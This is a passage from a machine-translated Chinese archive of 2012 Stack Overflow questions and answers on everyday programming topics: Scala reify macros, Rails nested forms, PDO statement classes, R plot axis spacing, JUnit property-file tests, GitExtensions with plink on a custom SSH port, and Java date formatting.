基本上 pex 非常擅长生成覆盖范围。如果您没有测试并且想要一些快速，请使用 Pex。但是我建议不要再次使用它，而是强制执行新代码的标准，以通过手写测试满足商定的覆盖率指标。

这样，来自 pex 的脆弱测试会随着时间的推移被更灵活和更高质量的测试所取代。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-06T13:01:43.067

Pex 对于测试不依赖任何外部的复杂算法非常有用。例如，它不会帮助您找到 SQL 语句或文件访问中的边缘情况。但是，对于发现边缘情况和增加代码覆盖率，除了正常的单元测试之外，它非常有用。

# android - 调整 Android 主页软按钮的大小

> ID：12300606
> 
> 赞同：0
> 
> 时间：2012-09-06T12:55:00.900
> 
> 标签：android, android-widget, android-gui

我有 2.2 android 屏幕上的主页按钮（软按钮），现在我需要更改该按钮的大小以使其更宽更高。那也是嵌入式设备，所以我没有应用商店等。所以如何将按钮更改为更大。

# android - ActionBarSherlock 和某种重写 setTitle 方法

> ID：12300613
> 
> 赞同：0
> 
> 时间：2012-09-06T12:55:18.630
> 
> 标签：android, android-layout, actionbarsherlock

我正在使用 ActionBarSherlock 并且我的应用程序中的很多片段都使用 setTitle 方法，例如：

```
getActivity().setTitle(articleName); 
```

但是我正在为 ActionBar 使用自定义样式，并且在更改标题时我想在我的 TextView 上更改它。

```
<?xml version="1.0" encoding="utf-8"?>

<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="match_parent"
              android:layout_height="match_parent">

    <TextView
            android:layout_width="wrap_content"
            android:layout_height="fill_parent"
            android:gravity="center"
            android:textColor="@color/grey"
            android:id="@+id/bar_title"
            style="@style/Text.Medium">
    </TextView>

</LinearLayout> 
```

是否有可能覆盖 setTitle 并添加我自己的代码来做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T12:59:36.310

由于该[`setTitle`](https://developer.android.com/reference/android/app/Activity.html#setTitle%28int%29)方法不是最终的，您可以在您的内部覆盖它`Activity`，然后在您的`Fragment`.

# scala - reify宏扩展期间的StackOverflowError

> ID：12300617
> 
> 赞同：1
> 
> 时间：2012-09-06T12:55:19.573
> 
> 标签：scala, macros, scala-2.10, reification, reify

我有一个使用 reify 的简单测试宏。它会在宏扩展期间导致 StackOverflowError。

```
def test() = macro testimpl

def testimpl(c:Context)():c.Expr[Any] = {
  import c.universe._
  val o = reify { // StackOverflowError here
    object O
    O
  }
  o
} 
```

为什么会这样？可以以某种方式避免吗？

编辑：这就是 M6 发生的事情。我刚刚用 M7 试了一下，现在它说

> 实现限制：无法具体化类型 Object{def (): O.type} (ClassInfoType)

所以这回答了为什么的问题，但问题仍然是是否有办法解决这个问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T16:45:07.490

目前，reifier 不知道如何 reify 引用在被 reified 的块中定义的东西的类型。因此错误。

但这与您的示例有什么关系？这是它的工作原理。

为了具体化您的代码块，编译器使用`def apply[T: AbsTypeTag](mirror: MirrorOf[self.type], treec: TreeCreator): Expr[T]`（2.10.0-RC1中的更新`AbsTypeTag`已重命名为`WeakTypeTag`）来创建一个具体化表达式的 Expr 类型的对象。然而，在 Expr 的合同中隐含的是，它还捕获了 reifee 的类型，这导致了问题。

因此，您需要一种解决方法。最简单的方法是将`O`代码段的最后一行转换为可具体化的内容，例如 write `O.asInstanceOf[Object]`。然后，您可以手动从结果中剥离`asInstanceOf`部分。

```
scala> reify { object O; O }
<console>:26: error: implementation restriction: cannot reify type Object{def <init>(): O.type} (ClassInfoType)
              reify { object O; O }
                    ^

scala> reify { object O; O.asInstanceOf[Object] }
res1 @ 2d059fd6: reflect.runtime.universe.Expr[Object] =
Expr[java.lang.Object]({
  object O extends AnyRef {
    def <init>() = {
      super.<init>();
      ()
    }
  };
  O.asInstanceOf[Object]
}) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-15T16:08:51.393

我最近遇到了同样的问题。但是我负担不起转换对象类型，因为我在另一个宏中使用单例类型来区分（编译时）“变量”。因此，如果您确实需要具体化一个对象，您可以在宏中执行以下操作，以便具体化返回对象而不是 Unit 值。

```
def mkObject(c: Context) = {
  import c.universe._

  val objectO = reify { object O }
  c.Expr(objectO.tree match {
    case Block(stats, expr) => Block(stats, Ident(newTermName("O")))
  })
} 
```

# ruby-on-rails - 模型和嵌套表单

> ID：12300619
> 
> 赞同：0
> 
> 时间：2012-09-06T12:55:28.830
> 
> 标签：ruby-on-rails, model, nested-forms

我正在构建一个为消费者和企业提供功能的应用程序。在创建我的模型时，我正在考虑让用户（消费者）和企业......每个企业也会有用户，但用户不一定属于一个企业。为了减少冗余，我会在用户中收集姓名、电子邮件等，在商业中收集特定的商业信息（地址、电话）。

```
class Business < ActiveRecord::Base
   belongs_to :user  
end

class User < ActiveRecord::Base
 has_one :business #only if business user, not consumer
end 
```

这是配置所需关系的正确方法吗？

那么当需要进行商业注册时，是否有可能（以及如何）在我的业务对象首先出现的地方嵌套表单，然后是用户......所以我按这个顺序收集信息？我发现的所有示例/信息都显示了首先捕获用户信息的设置，然后是任何子模型。

在我的以下示例中，这是否正确：

```
<%= form_for(@business) do |f| %>
  #grab business info
<%= f.fields_for :user do |ff| %>
 #grab user info 
```

感谢您的时间和帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T13:33:26.737

您提到企业可能有多个用户，因此应该是：

```
class Business < ActiveRecord::Base
  has_many :users
end 
```

然后用户将属于一个企业（可选）

```
class User < ActiveRecord::Base
  belongs_to :business
end 
```

在您的表单中，您首先调用一个企业的表单：

```
form_for @business do |business_form| 
```

然后您可以编辑企业用户：

```
business_form.fields_for :users do |user_form| 
```

如果您正在创建的新业务还没有任何用户，您可以在控制器中为该业务构建任意数量的用户，以便用户子表单具有可使用的对象。在您的控制器中：

```
5.times do
  @business.users.build
end 
```

以上将为该业务产生 5 个新的用户子表单。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:34:33.267

你需要有

```
 class Business < ActiveRecord::Base
  belongs_to :user  
 end

 class User < ActiveRecord::Base
  has_one :business #only if business user, not consumer
  attr_accessible :business_attributes
  accepts_nested_attributes_for :business
 end 
```

和形式应该是

```
 <%= form_for(@user) do |f| %>
  #grab user info
 <%= f.fields_for :business_attributes do |ff| %>
  #grab business info 
```

然后在 update 方法中使用 update_attributes 来更新用户

# php - 扩展 PDOStatement 以使用默认的 FETCH_CLASS。期望类名作为字符串

> ID：12300620
> 
> 赞同：2
> 
> 时间：2012-09-06T12:55:29.603
> 
> 标签：php, pdo, pdostatement

我一直在玩弄 PDO 来尝试为结果创建一个默认返回类，并使其成为一般的默认行为。

这使我发现我需要扩展`PDOStatement`以便它在实例化时设置我的默认类。

代码中没有明显的错误。

当我在 DB 包装器中创建 PDO 实例时，我将 DB 句柄设置为使用我的扩展语句类，并将类名作为结果类的参数传递。我通常会使用 stdClass 但相反，我创建了一个简单的类扩展`ArrayObject`.

```
$pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_CLASS);
$pdo->setAttribute(
    PDO::ATTR_STATEMENT_CLASS,
    array(
        'DatabaseStatement',
         array('DatabaseRow')
    )
); 
```

这一切看起来都很好，但我收到以下错误：

`SQLSTATE[HY000]: General error: Invalid class name (should be a string)`

这不是最好的错误消息，也没有真正提供有关错误发生的原因或位置的任何信息，但我相信这是由于上面的部分，因为一旦我删除了该部分，它就不会发出错误了。

希望有人能给我一个前进的方向，因为我已经在 Google/SO-ing 一段时间了，但是，唉，无济于事。

提前感谢您，如果我提供的内容不够，请随时询问更多信息：]

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T14:35:46.263

*叹*

嗯，我已经解决了这个问题。我的功能之一是将扩展 PDOStatement 类中的一个方法中的参数覆盖为`null`，从而导致我的自定义行类被替换。哎呀。

这是一件很容易错过的事情。当你离开一个项目很短一段时间然后又回来的时候，你会注意到什么！哈哈哈……呃，不好意思。

# backbone.js - 在单页应用程序中将子流量重定向到主页

> ID：12300621
> 
> 赞同：1
> 
> 时间：2012-09-06T12:55:36.267
> 
> 标签：backbone.js, web, asp.net-web-api, single-page-application

您如何将所有子页面流量重定向到您的 spa 中的主页。我知道它与服务器相关，除了在服务器中重写规则之外，还有其他优雅的方式。

我的情况是 iis，服务器端代码是用 ms 技术编写的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-29T14:39:44.150

如果您使用的是 MVC 应用程序，您可以在控制器方法中执行 Response.Redirect 或在服务器端调用另一个操作方法，您无需求助于 URL 重写。

# r - 删除r中绘图区域周围的间距

> ID：12300622
> 
> 赞同：31
> 
> 时间：2012-09-06T12:55:37.143
> 
> 标签：r, plot

当我创建以下绘图时，我在绘图区域和轴之间得到了不需要的空间（即蓝色框和 x 轴之间的空白区域。如何删除这个空间并使绘图区域与绘图轴齐平？谢谢。

```
xleft<-c(1,2,2.5)
xright<-c(2,2.5,2.75)
ybottom<-c(1,2,2.5)
ytop<-c(2,2.5,2.75)

par(mar = c(15,15,2.75,2.75) + 0.1)
plot(c(1,2.75),c(1,2.75),type="n",main="title",xlab="site.x",ylab="ylab")
rect(xleft,ybottom,xright,ytop,col=c("blue","red","green"))

#Label position along  axes
x.label.position<-(xleft+xright)/2
y.label.position<-(ybottom+ytop)/2

 #Labels
 x.label<-c("Long species Name1","Long species Name2","Long species Name3")
 y.label<-c("Long species Name4","Long species Name5","Long species Name5")

 text(par()$usr[1]-0.5,y.label.position,y.label,xpd=TRUE,adj=1)
 text(y=par()$usr[3]-0.5,x=x.label.position,x.label,xpd=TRUE,adj=1,srt=90)

 par(xpd=TRUE)
 legend(-0.1,0,legend=c("Species A","Species B","Species C"),fill=c("blue", "red", "green")) 
```

![在此处输入图像描述](../Images/e14caf4957fe60ec056a2c0815513e2d.png)

更新我用我的实际数据尝试了 plannapus 的建议，但只能让 y 轴表现出来，在这段代码中是否还有其他一些东西在绘图区域的两侧增加了空间？

```
quartz("colour.plot")
par(mar=c(15,15,4,2)+0.1)#sets margins of plotting area

#create the data plot
    plot(c(0,100), c(0,100), type = "n", main = paste(x,"vs",y," -",depth),xlab=paste("Species composition in remainder ",x),ylab=paste("Species composition in remainder ",y),asp=1,xaxs="i",yaxs="i")

#Add the rectangles
rect(mdf$xleft,mdf$ybottom,mdf$xright,mdf$ytop,col=mdf$colour) 
```

生产

![在此处输入图像描述](../Images/f2ac8e45d4857f5ffbab503c68365166.png)

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2012-09-06T12:59:15.103

函数中有一个参数`plot`可以处理：（`xaxs`以及`yaxs`y 轴）。默认情况下，它设置为`xaxs="r"`表示每侧保留 4% 的轴值。要将其设置为 0 `xaxs="i"`：. 有关详细信息，请参阅中的`xaxs`部分`?par`。

```
plot(c(1,2.75),c(1,2.75),type="n",main="title",xlab="site.x",ylab="ylab", xaxs="i", yaxs="i")
rect(xleft,ybottom,xright,ytop,col=c("blue","red","green")) 
```

![在此处输入图像描述](../Images/d1caa7c54a036e7f75a1f5e0174dead6.png)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-06T12:58:43.263

```
plot(c(1,2.75),c(1,2.75),type="n",main="title",xlab="site.x",ylab="ylab",axes=F) # ann
axis(1,pos=1)
axis(2,pos=1) 
```

所有轴都被删除，然后您可以添加新轴到`pos`您想要的。

# java - Junit：如何测试从属性文件中读取属性的方法

> ID：12300624
> 
> 赞同：6
> 
> 时间：2012-09-06T12:55:45.640
> 
> 标签：java, junit

嗨，我有一个类`ReadProperty`，它有一个`ReadPropertyFile`返回类型的方法，`Myclass`它从属性文件中读取参数值并返回`Myclass`对象。我需要帮助来测试`ReadPropertyFile`方法`JUnit`，如果可能的话，使用模拟文件和模拟对象。

这是我的代码。

```
import java.io.FileInputStream;
import java.util.Properties;

public class ReadProperty {

    public Myclass ReadPropertyFile(String fileName) {
        Myclass myclass = null;
        String testparam = null;

        FileInputStream fis = null;

        Properties prop = new Properties();
        try {
            fis = new FileInputStream(fileName);
            try {
                prop.load(fis);
                System.out.println("Load Property file : Success !");
            } catch (Exception ex) {
                System.out.println("Load Property file : Exception : " + ex.toString());
            }
            /*
             * loading the properties
             */
            try {
                testparam = prop.getProperty("testparam");
                System.out.println("testparam Type : " + testparam);
            } catch (Exception ex) {
                System.out.println("testparam Type : " + ex.toString());
            }

        } catch (Exception ex) {
            ex.printStackTrace();
            System.out.println("Property file read fail : " + ex.toString());
            System.exit(1);
        }
        Myclass = new Myclass(testparam);
        return Myclass;
    } } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T13:00:08.473

我不认为你真的需要在这里嘲笑任何东西。您想测试您的属性阅读器是否能够按照您的预期访问和读取文件，因此请准确测试。对于常规属性，它可以像这样：

```
@Test
public void shouldReadPropFileFromSingleString() {

    final Properties p = PropertiesLoader
            .loadProperties("propfile");
    assertNotNull(p);
    assertFalse(p.isEmpty());
    for (final Entry<Object, Object> e : p.entrySet()) {
        assertEquals(expectedProperties.get(e.getKey()), e.getValue());
    }
} 
```

对于您的情况，您可以对其进行调整：

```
@Test
public void shouldReadCorrectProp() {

    final MyClass p = ReadProperty
            .readPropertyFile("propfile");
    assertNotNull(p);
    assertEquals(expectedProperty, p);
} 
```

您可能还想测试悲伤的路径 - 如果找不到属性文件会发生什么，是否有任何可用的后备属性等。

顺便说一句，我建议更改方法名称，因为读取属性文件不是您的方法的主要关注点 - 检索属性是。更好的是，将方法分解为一个方法`getProperty`和一个`readPropertyFile`方法，其中第一个方法调用第二个方法。因此，根据[Sepaton of Concerns ，您将拥有更清洁的设计](http://en.wikipedia.org/wiki/Separation_of_concerns)

# jquery - 如何检查图像是否加载？

> ID：12300626
> 
> 赞同：0
> 
> 时间：2012-09-06T12:55:52.453
> 
> 标签：jquery, mjpeg

我正在使用[mjpeg](http://en.wikipedia.org/wiki/Motion_JPEG)格式来显示来自 IP 摄像机的流。问题是流不稳定，我不知道它什么时候开始，所以我需要以某种方式检查图像 url，如果有例如 > 5 个图像，然后加载它。像这样，但在将其添加到页面之前检查**url 。**

目前我有：

```
$('#image_div').append('<img width="320" height="240" border="0" src="http://'+url+':'+port+'/?up" id="image">');
$('#image').load(function(){
    console.log($(this));
}); 
```

在控制台中它看起来像：http: [//i.stack.imgur.com/iM88J.png](http://i.stack.imgur.com/iM88J.png)

如果没有流，我只接收其中一个。所以我需要在添加之前以某种方式检查它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:03:54.033

这是我过去使用过的一个很棒的插件。在大多数情况下，它可以在大多数浏览器中顺利运行。

[https://github.com/desandro/imagesloaded](https://github.com/desandro/imagesloaded)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:49:21.017

我不确定这是做什么的：

```
$('#image_div').append('<img src="http://'+url+':'+port+'/?up">'); 
```

我从未使用过 mjpeg 和 javascript，但我认为这个 URL 是 jpeg 流。

无论如何，您可以创建图像对象，将它们加载到内存中并随时显示它们。前：

```
var cache = [];
$(new Image()).attr('src', 'http://'+url+':'+port+'/?up').load(function() {
    // image loaded but not injected
    cache.push(this);
    if ( cache.length == 5 ) {
        // 5 images loaded, do something with cache array
    }
}); 
```

这回答了你的问题了吗？

# image-processing - 如何解决这个泊松图像编辑实现中的矩阵系数？

> ID：12300628
> 
> 赞同：2
> 
> 时间：2012-09-06T12:55:57.590
> 
> 标签：image-processing

[本文](http://www.ctralie.com/Teaching/PoissonImageEditing/)解释了我们如何使用泊松图像编辑来混合图像。在这个实现中，我们得到了泊松方程，我们从中形成了一个线性方程组 Ax=B。

我很难理解矩阵 A 和 B 中的系数。我相信矩阵 B 是我们粘贴在另一个图像上的图像的梯度。

一旦我知道 A 和 B 是什么，我就可以编写一个程序来解方程。我怎样才能找到 A 和 B 会是什么？

# c - 在 C 中对指针变量进行 mod

> ID：12300636
> 
> 赞同：1
> 
> 时间：2012-09-06T12:56:11.850
> 
> 标签：c, embedded, 68000

我正在为摩托罗拉 68000 微处理器使用嵌入式 C。我想将指针地址存储在 uint16 变量中，然后想做变量的 mod。我这样做的主要原因是检查 EEPROM 的扇区是否正确分配。

例如->

```
 uint16 a, c;
 uint16 *b;
 b=&a;
 c=b%4; 
```

像这样的东西。显然，我不能这样做。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T13:00:37.010

您是否仅限于 16 位地址空间，即 64 KB 的 RAM？这对于 68k 系统来说是相当小的。

无论如何，您需要将指针转换为整数类型才能对其进行算术运算；

```
#include <stdint.h>

uint16 a, *b = &a;
intptr_t c = (intptr_t) b;

if( (c % 4) != 0 )
{
  /* bad address! */
} 
```

请注意，上面*没有*将地址存储在 16 位变量中，因为这不是正确的方法。相反，它用于`intptr_t`将指针保存为整数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T13:00:06.883

```
b = (uint16*)(((uint16)(&a)) % 4); 
```

# magento - 为什么 Magento 在我可以将产品添加到购物车之前强制我登录？

> ID：12300640
> 
> 赞同：1
> 
> 时间：2012-09-06T12:56:24.700
> 
> 标签：magento, login, cart

我正在使用 Magento v. 1.7.0.2 开发一个电子商务网站，出于某种原因，每次我尝试在前端将产品添加到购物车时，系统都会要求我先登录，然后才能添加它。

我启用了访客结帐，但我的测试产品均不可下载。

有趣的是，它只发生在 Windows 上。我在 Windows 上清除所有浏览器中的缓存并尝试它，每当我尝试将产品添加到购物车时，我都会进入登录/注册屏幕。

但是，如果我在 Mac 上对其进行测试，它可以完美运行。

为什么会发生这种情况，我该如何解决？

非常感谢！

辛西娅

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T13:06:51.990

这取决于：

1.  如果从系统 > 配置 > 结帐启用访客结帐，则在您的配置中
2.  在您的产品上，如果它们是可下载的，那么它们只能由注册用户购买

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T13:50:58.150

好吧，我解决了这个问题。信不信由你，这是我的 CSS 错误。我让愿望清单链接 div 与添加到购物车按钮重叠，实际上用愿望清单链接覆盖了它。

因此，虽然*看起来*我正在单击“添加到购物车”，但实际上我正在将该项目添加到我的愿望清单中，如果没有登录的注册用户，这是无法完成的。

叹息......大DOH！对我而言。

这个故事的寓意是：总是检查你的代码！

# javascript - 如何使用 javascript 或 jquery mobile 从 url 读取和显示 XML 文件？

> ID：12300645
> 
> 赞同：0
> 
> 时间：2012-09-06T12:57:10.977
> 
> 标签：javascript, android, jquery, xml, jquery-mobile

我正在使用 PhoneGap 创建一个 android 应用程序。我要做的是显示我创建的网站（.php 格式）中的 xml 文件的内容。有什么建议吗？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:01:43.423

您需要像[这里](https://stackoverflow.com/a/10177420/942368)提到的那样将您的域列入白名单，然后您可以简单地使用 jQuery ajax

# coldfusion - 使用 ColumnText 获取适合框的文本

> ID：12300646
> 
> 赞同：1
> 
> 时间：2012-09-06T12:57:16.140
> 
> 标签：coldfusion, pdf-generation, itext

我在 ColdFusion 应用程序中使用 iText 库来创建 PDF，目标是将各种文本添加到特定位置的特定大小的框中。

使用 ColumnText 可以完美完成（跳过细节）：

```
<cfset directContent = writer.getDirectContent()>
<cfset ct = CreateObject("java", "com.lowagie.text.pdf.ColumnText").init(directContent)>
<cfset ct.setSimpleColumn(100, 50, 400, 400, 18, Element.ALIGN_JUSTIFIED)>
<cfset ct.setText( createObject("java", "com.lowagie.text.Phrase").init("#text_var#") ) >
<cfset ct.go()> 
```

问题是：长文本被剪切，正如预期的那样（`go()`返回`ColumnText.NO_MORE_COLUMN`）。但在这种情况下，我需要通过在末尾添加例如“...”来表明文本并未完成（添加点或如果需要用“...”替换最后一个或两个符号）。

有没有一种简单的方法可以实现这一目标？例如，在我调用之后`go(true)`- 我可以看到用于输出文本而没有实际输出的行数。但我需要以某种方式将实际文本放入框中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T14:38:43.453

您正在使用功能强大的 iText 旧版本，我不知道以我命名的软件包是否支持我要回答的内容。

Q1：我想在最后加上……。A1：如果go()返回NO_MORE_COLUMN，则可以得到已经写入的最后一行的最后一个X位置的X位置。请参阅[http://api.itextpdf.com/itext/com/itextpdf/text/pdf/ColumnText.html#getLastX%28%29](http://api.itextpdf.com/itext/com/itextpdf/text/pdf/ColumnText.html#getLastX%28%29) 您可以使用 getYLine 获取 Y 位置。请参阅[http://api.itextpdf.com/itext/com/itextpdf/text/pdf/ColumnText.html#getYLine%28%29](http://api.itextpdf.com/itext/com/itextpdf/text/pdf/ColumnText.html#getYLine%28%29) 您可以使用此 X 和 Y 在适当的位置添加“...”。

Q2：我不希望文字被剪切；我想将文本放入矩形内。A2：这正是本示例中所做的：http: [//itextpdf.com/examples/iia.php](http://itextpdf.com/examples/iia.php?id=163) ?id=163 在方法 addParagraph() 中，以模拟模式添加文本以查看是否合适。如果是这样，则添加的文本是真实的；如果不是，则再次添加文本，但使用较小的字体。

# git - GitExtensions 和 PuTTY 通过自定义端口上的 SSH

> ID：12300647
> 
> 赞同：6
> 
> 时间：2012-09-06T12:57:26.790
> 
> 标签：git, ssh, putty, git-extensions

我有一个 Git 存储库，我使用类似于以下的路径提取它：

```
git pull ssh://username@host.com:1234/path/to/repository.git 
```

当 GitExtensions 然后尝试使用 plink 从存储库中提取时，它会进行以下调用：

```
plink -T username@host.com:/path/to/repository.git 
```

这最终会失败，因为它实际上是在 ping 端口 #22，而不是 #1234。

正确的呼吁是

```
plink -T -P 1234 username@host.com:/path/to/repository.git 
```

如果我在 ~/.ssh/config 中创建一个别名“hostCom”，如果我这样做，它似乎可以正常工作（连接到 #1234）：

```
plink -T username@hostCom 
```

但是，只要我也添加了 Git 存储库的路径，它就会再次转到 #22。

我尝试的另一个选择是在 PuTTY 中创建一个会话。让我们称它为“hostPutty”，并在那里设置默认端口，等等。底线最终是一样的：不能将 Git 存储库的路径与自定义端口结合起来。

如何组合所有部分以使其工作？

[OpenSSH](https://en.wikipedia.org/wiki/OpenSSH)怎么能解决这个问题，而 PuTTY 却不能呢？OpenSSH 的唯一问题是，它在每次连接尝试时都会询问我私钥的密码（而且我不想在没有密码的情况下创建私钥）。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-06T18:45:04.893

我想通了。

这就是让我走错路的原因：

*   不要在 PuTTY 中创建任何会话，如此[处所述](http://blog.dmbcllc.com/gitextension-putty-alternate-port/)
*   不要使用您可能在文件*~/.ssh/config中定义的任何主机别名*

以下是如何让它工作：

*   显然确保将 GitExtensions 设置为使用 PuTTY，而不是 OpenSSH
*   确保*plink.exe*（与 GitExtensions 一起可用或专门与 PuTTY 一​​起安装的那个）位于没有空格的路径中
*   将环境变量*%GIT_SSH%*设置为指向*plink.exe*（默认情况下它可能指向*ssh.exe*），确保没有撇号，因为该值将“按原样”使用（这就是为什么你可以' t 使用上述空格）

```
echo %GIT_SSH%

C:\tools\PuTTY\plink.exe 
```

*   在上面的示例中，使用“full”命令进行拉取，没有任何允许您不指定端口等的主机别名。如果端口丢失，并且只有一个冒号，Git 将其视为路径分隔符，并将*ssh*视为端口分隔符（因此它们咬得相当糟糕）。

    git clone ssh://username@host.com:1234/path/to/repository.git

如果你这样做了，Git 和 plink 实际上会解决问题！

如果您不这样做，您可能会遇到各种问题，例如：

*   我让*%GIT_SSH%*指向*ssh.exe*并使用主机别名而不是路径 incl。港口

> ssh.exe": hostPutty:path: no address associated with name
> fatal: 远端意外挂断

*   在 %GIT_SSH% 中使用了撇号

> 错误：无法生成“C:\tools\PuTTY\plink.exe”：没有这样的文件或目录
> 致命：无法分叉

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-11-25T23:43:39.477

对我来说，我不断收到主机名不存在的错误。在尝试了有关此线程和其他线程的大量建议后，我检查了我的远程 URL，这是罪魁祸首。如果您使用的是 PuTTY，请确保它以*git@github.com*开头，而不是*https://github*。

[![这是一个如何在 Git 扩展中检查的示例](../Images/656efe6d93ea8f0352a289305f3d732d.png)](https://i.stack.imgur.com/5mTuj.png)

# javascript - 数组中的数组

> ID：12300648
> 
> 赞同：0
> 
> 时间：2012-09-06T12:57:34.833
> 
> 标签：javascript, arrays

我相信我要做的是在一个数组中声明几个数组。在文本文档中，我有以下内容：

```
"一","いち","one"
"二","に","two"
"三","さん","three"
"四","し・よん","four"
"五","ご","five" 
```

我想将其自动放入一个数组中，并将项目分配为 3 个组，因此例如 set_one[0][1] 将是“いち”，set_one[3][2] 将是“四”，依此类推。

对于我的一生，我什至无法弄清楚如何从纯文本文档中逐行读取值，更不用说尝试将它们自动分配到数组中了..所以我手动尝试了。我有：

```
var set_one = new Array(new Array("一", "いち","one"), new Array("二", "に","two", new Array("三", "さん","three", new Array("四", "よん・し","four", new Array("五", "ご","five"); 
```

其中，当 document.write(set_one[3][2]); 被调用，什么都没有发生。我什至尝试了一个 for 循环来查看 (set_one) 数组中是否存在任何东西，尽管据我所知，什么都没有。

至少可以说，在这台 Windows 机器上工作很困难，因为我没有可用的调试工具，而且它没有有效的 Internet 连接！我究竟做错了什么？有没有更好的方法来做到这一点？是否甚至可以将值自动逐行读取到数组中，然后根据逗号值将值分配给各个数组？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T13:03:30.657

您没有正确创建数组。例如，当您有：

```
new Array("二", "に","two", new Array("三", "さん","three")) 
```

您实际上是在创建一个单元素数组，其中*第三个*位置*本身就是*另一个数组。要么使用：

```
new Array (new Array("二", "に","two"), new Array("三", "さん","three")) 
```

或者在 JavaScript 中创建数组的更简单、更容易混淆的方法：

```
var set_one = [ 
  [ "一","いち","one" ],
  [ "二","に","two" ],
  [ "三","さん","three" ],
  [ "四","し・よん","four" ],
  [ "五","ご","five" ] 
];
set_one[0][1]; // いち 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:03:17.707

```
var set_one = [
["一","いち","one"], 
["二","に","two"], 
["三","さん","three"], 
["四","し・よん","four"], 
["五","ご","five"]
]; 
```

# java - 将字符串转换为 java 中的日期，格式为 2012-07-27

> ID：12300651
> 
> 赞同：1
> 
> 时间：2012-09-06T12:57:41.523
> 
> 标签：java

我的输入字符串为 2012-07-27，我希望输出为日期，但格式与 2012-07-27 相同

我的代码是

DateFormat df = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");

```
 try {
        Date today = df.parse("20-12-2005");
        System.out.println("Today = " + df.format(today));

                 } catch (ParseException e) {
        e.printStackTrace();
    } 
```

我的输出是

```
Fri Jul 27 00:00:00 IST 2012 
```

但我想返回日期对象，如 2012-07-26 23:59:59 而不是字符串，请提供任何帮助

任何帮助都非常感谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-06T13:01:03.220

您可以使用与`SimpleDateFormat`解析日期相同的方法将日期格式化为字符串。

```
SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd");
Date date1 = formatter.parse("2012-07-27");
System.out.println(date1); // prints Fri Jul 27 00:00:00 IST 2012
System.out.println(formatter.format(date1)); // prints 2012-07-26 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T13:01:18.747

首先，我认为重要的是要注意`System.out.println`隐式调用`toString`其参数的方法。参数必须是它的一个`Object`或一个子类。并且`Date`是 的子类`Object`。话虽如此，看看 1.7 的`Date#toString`实现，

```
public String toString() {
        // "EEE MMM dd HH:mm:ss zzz yyyy";
        BaseCalendar.Date date = normalize();
        StringBuilder sb = new StringBuilder(28);
        int index = date.getDayOfWeek();
        if (index == gcal.SUNDAY) {
            index = 8;
        }
        convertToAbbr(sb, wtb[index]).append(' ');                        // EEE
        convertToAbbr(sb, wtb[date.getMonth() - 1 + 2 + 7]).append(' ');  // MMM
        CalendarUtils.sprintf0d(sb, date.getDayOfMonth(), 2).append(' '); // dd

        CalendarUtils.sprintf0d(sb, date.getHours(), 2).append(':');   // HH
        CalendarUtils.sprintf0d(sb, date.getMinutes(), 2).append(':'); // mm
        CalendarUtils.sprintf0d(sb, date.getSeconds(), 2).append(' '); // ss
        TimeZone zi = date.getZone();
        if (zi != null) {
            sb.append(zi.getDisplayName(date.isDaylightTime(), zi.SHORT, Locale.US)); // zzz
        } else {
            sb.append("GMT");
        }
        sb.append(' ').append(date.getYear());  // yyyy
        return sb.toString();
    } 
```

对象的字符串表示形式`Date`指定为`EEE MMM dd HH:mm:ss zzz yyyy`。这正是您所看到的。

如果您想以`Date`不同的格式显示对象，请使用`SimpleDateFormat`该类。`Date`它的唯一目的是为对象表示为字符串的方式增加灵活性。

* * *

*还有*...

一种可能但荒谬的解决方法是创建自己的包装类，

```
public class MyDate{
    private final Date d;
    private final SimpleDateFormat sdf;

    public(Date d, SimpleDateFormat sdf){
        this.d = d;
        this.sdf = sdf;
    }

    // not recommended...should only be used for debugging purposes
    @Override
    public String toString(){
        return sdf.format(d);
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-06T13:01:35.253

您可以`String`使用相同的`SimpleDateFormat`. 该[`format`](http://docs.oracle.com/javase/6/docs/api/java/text/DateFormat.html#format%28java.util.Date%29)方法这样做：

```
SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
Date date1 = sdf.parse("2012-07-27");
System.out.println(sdf.format(date1); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-06T12:59:21.213

您必须使用另一个`SimpleDateFormat`具有所需输出格式的 ( `format()`)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-06T13:04:16.247

中没有“格式”属性[`java.util.Date`](http://docs.oracle.com/javase/6/docs/api/java/util/Date.html)。一个`Date`实例是一个相当简单的对象，代表一个时间点（实际上，它的状态仅由它在内部存储的 unix 时间戳定义）。

